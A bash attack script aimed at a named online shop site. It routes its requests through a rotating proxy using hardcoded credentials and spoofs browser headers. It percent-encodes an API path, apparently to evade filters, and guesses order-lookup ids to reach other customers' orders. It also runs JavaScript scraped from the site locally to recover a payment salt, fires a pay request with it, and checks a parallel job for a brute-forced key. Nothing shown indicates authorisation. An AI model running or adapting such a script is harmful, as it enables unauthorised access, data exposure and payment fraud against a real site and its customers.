#!/bin/bash
set -u
KEY=C413ED6D
PWD=344F550A6F8B
RESP=$(curl -s --max-time 10 "https://share.proxy.qg.net/get?key=$KEY&num=1")
SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception:
 print('')" "$RESP")
PROXY_URL="http://$KEY:$PWD@$SERVER"
echo PROXY=$PROXY_URL
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://xxn7788.top/shop
CK=/tmp/xxn_d3.ck
OUT=/tmp/xxn_d3_out
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
c(){ curl -sk --connect-timeout 4 --max-time 20 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" -H 'X-Requested-With: XMLHttpRequest' "$@"; }

c "$BASE/" -o "$OUT/home.html" -w "HOME=%{http_code}:%{size_download}\n"
c "$BASE/%61pi.php?act=goodslist" -o "$OUT/goodslist.json" -w "gl=%{http_code}:%{size_download}\n"
c "$BASE/%61pi.php?act=classlist" -o "$OUT/classlist.json" -w "cl=%{http_code}:%{size_download}\n"

python3 - <<'PY'
import json
g=json.load(open('/tmp/xxn_d3_out/goodslist.json',encoding='utf-8'))
data=g.get('data') or []
print('goods', len(data))
for row in data[:20]:
    print(row.get('tid'), row.get('cid'), str(row.get('name',''))[:60], 'price', row.get('price'))
open('/tmp/xxn_d3_out/tids_from_goods.txt','w').write('\n'.join(str(r.get('tid')) for r in data if r.get('tid')))
PY

c -X POST -d 'cid=58' "$BASE/ajax.php?act=gettool" | tee "$OUT/tool58.json" | head -c 500; echo

TID=$(python3 -c "import json;d=json.load(open('/tmp/xxn_d3_out/goodslist.json'))['data'];print(d[0]['tid'])")
echo TID=$TID
for url in \
  "$BASE/?cid=58&tid=$TID" \
  "$BASE/?mod=buy&cid=58&tid=$TID" \
  "$BASE/?cid=0&tid=$TID" \
  "$BASE/?mod=shop&cid=58&tid=$TID"; do
  code=$(c -o /tmp/buytry.html -w "%{http_code}:%{size_download}" "$url")
  has_hs=$(grep -c 'hashsalt' /tmp/buytry.html || true)
  has_csrf=$(grep -c 'csrf_token' /tmp/buytry.html || true)
  echo "URL => $code hs=$has_hs csrf=$has_csrf head=$(head -c 100 /tmp/buytry.html | tr '\n' ' ')"
  if [[ $has_hs -gt 0 || ( $has_csrf -gt 0 && $(wc -c </tmp/buytry.html) -gt 500 ) ]]; then
    cp /tmp/buytry.html "$OUT/buy.html"
    echo SAVED_BUY
  fi
done

CSRF=$(grep -oE 'name="csrf_token" value="[^"]+"' "$OUT/home.html" | head -1 | sed 's/.*value="//;s/"//')
echo CSRF=$CSRF
for q in 123456 7788 xxn7788 admin test 888888; do
  r=$(c -X POST --data-urlencode "qq=$q" --data-urlencode "csrf_token=$CSRF" "$BASE/ajax.php?act=query")
  echo "Q $q => ${r:0:220}"
  printf '%s' "$r" > "$OUT/q_$q.json"
done

c "$BASE/?mod=query&data=123456" -o "$OUT/modq.html" -w "mq=%{http_code}:%{size_download}\n"
echo "showOrder=$(grep -c showOrder $OUT/modq.html || true)"
# try ajax query type=1 with sample ids
for id in 1 100 500 1000 2000 2277; do
  r=$(c -X POST -d "qq=$id&type=1" "$BASE/ajax.php?act=query")
  echo "Qid $id => ${r:0:200}"
done

if [[ -f $OUT/buy.html ]]; then
  python3 - <<'PY'
import re,subprocess
h=open('/tmp/xxn_d3_out/buy.html',encoding='utf-8',errors='ignore').read()
csrf=re.search(r'name="csrf_token"\s+value="([^"]+)"',h)
hs=re.search(r'var\s+hashsalt\s*=\s*(.+?);',h)
print('csrf', bool(csrf), 'hs', bool(hs), 'len', len(h))
if hs:
    open('/tmp/xxn_hs.js','w').write('console.log('+hs.group(1)+')')
    r=subprocess.run(['node','/tmp/xxn_hs.js'],capture_output=True,text=True,timeout=30)
    print('hashsalt_decoded', r.stdout.strip()[:64])
    open('/tmp/xxn_d3_out/hashsalt.txt','w').write(r.stdout.strip())
    if csrf: open('/tmp/xxn_d3_out/csrf.txt','w').write(csrf.group(1))
PY
  # attempt pay
  if [[ -f $OUT/hashsalt.txt && -f $OUT/csrf.txt ]]; then
    HS=$(cat "$OUT/hashsalt.txt")
    CSRF2=$(cat "$OUT/csrf.txt")
    r=$(c -X POST \
      --data-urlencode "tid=$TID" \
      --data-urlencode "inputvalue=xxnprobe$(date +%H%M%S)" \
      --data-urlencode "num=1" \
      --data-urlencode "hashsalt=$HS" \
      --data-urlencode "csrf_token=$CSRF2" \
      --data-urlencode "paytype=alipay" \
      "$BASE/ajax.php?act=pay")
    echo "PAY => ${r:0:400}"
    printf '%s' "$r" > "$OUT/pay.json"
  fi
fi

python3 - <<'PY'
import json
d=json.load(open('/tmp/xxn_d3_out/goodslist.json'))['data']
print('total_goods', len(d))
prices=sorted(float(row.get('price') or 0) for row in d)
print('min_price', prices[0] if prices else None, 'max', prices[-1] if prices else None)
for row in d:
  name=str(row.get('name',''))
  if any(x in name for x in ['密码','取卡','联系','hint','pass']):
    print('hint_name', row.get('tid'), name[:80])
PY

# check d2 apikey progress
echo ===D2_KEY===
tail -5 /tmp/xxn_d2.log 2>/dev/null || true
test -f /tmp/xxn_d2_out/keyhit.txt && cat /tmp/xxn_d2_out/keyhit.txt || echo no_keyhit_yet

echo DONE_D3
